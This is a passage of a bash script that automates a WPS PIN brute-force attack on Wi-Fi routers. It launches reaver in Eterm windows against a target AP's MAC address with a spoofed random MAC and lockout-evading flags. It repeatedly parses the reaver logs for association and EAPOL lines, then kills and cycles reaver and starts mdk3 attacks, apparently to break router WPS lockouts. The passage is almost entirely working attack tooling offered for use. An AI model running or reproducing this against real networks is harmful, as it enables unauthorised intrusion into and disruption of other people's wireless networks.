	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

#######################

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"

echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver7" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

###################

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Recurring-delay pin attempts x     = $yel$RX1" 
echo -e "$info Recurring-delay sleep in sec y     = $yel$RY1"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"

echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver8" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null


clear
	fi

###############################Start USR Block################################################
######################Start Reaver channel hopping options

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"
echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver1h" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -vv -x 60 -L --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

